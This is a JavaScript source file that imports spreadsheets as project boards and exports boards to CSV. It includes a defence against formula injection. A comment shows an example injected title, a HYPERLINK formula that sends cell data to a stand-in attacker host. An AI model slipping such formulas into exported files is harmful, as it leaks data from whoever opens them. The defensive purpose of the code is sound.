/**
 * Spreadsheets in, spreadsheets out.
 *
 * A CSV or a worksheet already has the shape of a board: a header row is a
 * column list and every other row is an item. `boardFromTable` reads the same
 * column profile the ingest tier uses, so a file that already imported cleanly
 * as tasks becomes a board with the right column kinds rather than sixteen
 * text columns.
 */

import { profileColumns } from '../ingest/tabular.js'
import { DEFAULT_STATUS_LABELS, PRIORITY_LABELS, cellValue, typeOf } from './columns.js'
import { makeBoard, makeColumn, makeGroup, makeView } from './schema.js'

const slugId = (s, i) => (String(s || '').toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '') || `c${i}`).slice(0, 32)

/** @param {{headers: string[], rows: any[][], sheet?: string}} table */
export function boardFromTable(table, { name = 'Imported board', itemNoun = 'Item' } = {}) {
  const headers = table?.headers || []
  const rows = table?.rows || []
  if (!headers.length || !rows.length) return null
  const profile = profileColumns(headers, rows)

  const titleIndex = (profile.find((c) => c.role === 'title')
    || profile.find((c) => c.kind === 'text' && !c.role)
    || profile.find((c) => c.kind === 'text')
    || profile[0]).index

  const statusValues = new Set()
  const columns = []
  const bind = new Map()
  const usedIds = new Set()

  for (const spec of profile) {
    if (spec.index === titleIndex) continue
    const column = columnFor(spec, rows, statusValues)
    if (!column) continue
    // Two headers can carry the same words; two columns cannot share an id,
    // or the second one would read and write the first one's cells.
    while (usedIds.has(column.id)) column.id = `${column.id}-${spec.index}`
    usedIds.add(column.id)
    columns.push(column)
    bind.set(column.id, spec.index)
  }
  if (!columns.some((c) => c.kind === 'status')) {
    columns.unshift(makeColumn('status', 'Status', { labels: structuredClone(DEFAULT_STATUS_LABELS) }))
  }

  const groups = [makeGroup('Imported'), makeGroup('Done', 'good')]
  const status = columns.find((c) => c.kind === 'status')
  const date = columns.find((c) => c.kind === 'date')
  const views = [makeView('table', 'Main table')]
  if (status) views.push(makeView('kanban', 'By status', { groupBy: status.id }))
  if (date) views.push(makeView('calendar', 'Calendar', { dateColumn: date.id }))

  const board = makeBoard({ name, itemNoun, columns, groups, views })

  const items = rows.map((row, rowIndex) => {
    const title = String(row[titleIndex] ?? '').trim()
    if (!title) return null
    const draft = {
      title,
      meta: { board: board.id, group: groups[0].id, pos: rowIndex, columns: {}, editedByUser: true },
      status: 'open',
      people: [],
      tags: [],
      priority: 0,
    }
    for (const column of board.columns) {
      const index = bind.get(column.id)
      if (index === undefined) continue
      const raw = row[index]
      const type = typeOf(column)
      const value = type.fromText(raw === null || raw === undefined ? '' : String(raw), column)
      if (type.field === 'status') {
        draft.status = (column.labels || []).find((l) => l.id === value)?.maps || 'open'
        draft.meta.columns[column.id] = value
      } else if (type.field === 'priority') {
        draft.priority = (column.labels || []).find((l) => l.id === value)?.value ?? 0
        draft.meta.columns[column.id] = value
      } else if (type.field === 'timeline') {
        if (value) { draft.at = value.from; draft.end = value.to }
      } else if (type.field) {
        draft[type.field] = value
      } else if (!type.readOnly) {
        draft.meta.columns[column.id] = value
      }
    }
    if (draft.status === 'done') draft.meta.group = groups[1].id
    return draft
  }).filter(Boolean)

  return { board, items }
}

function columnFor(spec, rows, statusValues) {
  const settings = { id: `col-${slugId(spec.name, spec.index)}` }
  const values = rows.map((r) => r[spec.index]).filter((v) => v !== null && v !== undefined && String(v).trim() !== '')
  switch (spec.role) {
    case 'status': {
      for (const v of values) statusValues.add(String(v).trim())
      const labels = labelsFromValues([...statusValues])
      return makeColumn('status', spec.name, { ...settings, labels })
    }
    case 'owner':
      return makeColumn('person', spec.name, settings)
    case 'priority':
      return makeColumn('priority', spec.name, { ...settings, labels: structuredClone(PRIORITY_LABELS) })
    case 'tags':
      return makeColumn('tags', spec.name, settings)
    case 'due':
    case 'start':
      return makeColumn('date', spec.name, settings)
    case 'notes':
      return makeColumn('longtext', spec.name, settings)
    default:
      break
  }
  if (spec.kind === 'empty') return null
  if (spec.kind === 'date') return makeColumn('date', spec.name, settings)
  if (spec.kind === 'number') return makeColumn('number', spec.name, { ...settings, unit: spec.unit || '' })
  if (/^(url|link|website)$/i.test(spec.name) || values.every((v) => /^https?:\/\//i.test(String(v)))) {
    return makeColumn('link', spec.name, settings)
  }
  if (/e-?mail/i.test(spec.name)) return makeColumn('email', spec.name, settings)
  if (/phone|mobile|tel/i.test(spec.name)) return makeColumn('phone', spec.name, settings)
  const distinct = new Set(values.map((v) => String(v).trim().toLowerCase()))
  // A small, repeating vocabulary is a dropdown; anything else is free text.
  if (distinct.size > 1 && distinct.size <= 8 && values.length >= distinct.size * 2) {
    return makeColumn('dropdown', spec.name, { ...settings, labels: labelsFromValues([...new Set(values.map((v) => String(v).trim()))]), multi: false })
  }
  const longest = values.reduce((n, v) => Math.max(n, String(v).length), 0)
  return makeColumn(longest > 120 ? 'longtext' : 'text', spec.name, settings)
}

const TONE_ORDER = ['neutral', 'accent', 'warning', 'serious', 'good', 'critical']
const STATUS_MAPS = [
  [/done|complete|shipped|closed|resolved|won|published|hired/i, 'done', 'good'],
  [/block|stuck|risk|fail|lost|reject/i, 'blocked', 'critical'],
  [/progress|doing|active|wip|review|start/i, 'doing', 'warning'],
  [/cancel|drop|archiv/i, 'cancelled', 'neutral'],
]

function labelsFromValues(values) {
  const used = new Set()
  const labels = values.slice(0, 12).map((value, i) => {
    const found = STATUS_MAPS.find(([re]) => re.test(value))
    // "In Progress" and "in-progress" are two labels; they cannot be one id.
    let id = slugId(value, i)
    while (used.has(id)) id = `${id}-${i}`
    used.add(id)
    return {
      id,
      text: String(value).slice(0, 40),
      tone: found ? found[2] : TONE_ORDER[i % TONE_ORDER.length],
      maps: found ? found[1] : 'open',
    }
  })
  return labels.length ? labels : structuredClone(DEFAULT_STATUS_LABELS)
}

/** A board back out as CSV, in the column order the view shows. */
export function boardToCsv(board, items, columns = board.columns) {
  const header = [board.itemNoun || 'Item', 'Group', ...columns.map((c) => c.name)]
  const lines = [header.map(escape).join(',')]
  for (const item of items) {
    const group = board.groups.find((g) => g.id === item.meta?.group)?.name || ''
    const cells = columns.map((column) => typeOf(column).toText(cellValue(item, column, board), column))
    lines.push([item.title, group, ...cells].map(escape).join(','))
  }
  return lines.join('\n')
}

/*
 * A cell that a spreadsheet would run.
 *
 * Excel, LibreOffice and Sheets all treat a cell opening with = + - @, a tab
 * or a carriage return as a formula, and quoting does not stop them - the
 * quotes are CSV syntax and are gone before the formula is read. A row title
 * here can come from the headline of any page somebody saved, from an
 * imported board, or from a CSV that was imported in the first place, so
 * "=HYPERLINK(\"https://evil.example/?\"&A1,\"Invoice\")" is a title somebody
 * else can choose and this app would hand to a spreadsheet to execute.
 *
 * The fix is a leading apostrophe, which every spreadsheet reads as "this is
 * text" and does not display. Numbers are left alone: -5 and +3.2 are values,
 * not formulas, and prefixing those would wreck every numeric column to
 * defend against nothing.
 */
const RISKY_START = /^[=+\-@\t\r]/
const PLAIN_NUMBER = /^[+-]?(\d+\.?\d*|\.\d+)([eE][+-]?\d+)?$/

export const defuse = (text) => (RISKY_START.test(text) && !PLAIN_NUMBER.test(text) ? `'${text}` : text)

const escape = (value) => {
  const text = defuse(value === null || value === undefined ? '' : String(value))
  return /[",\n]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text
}
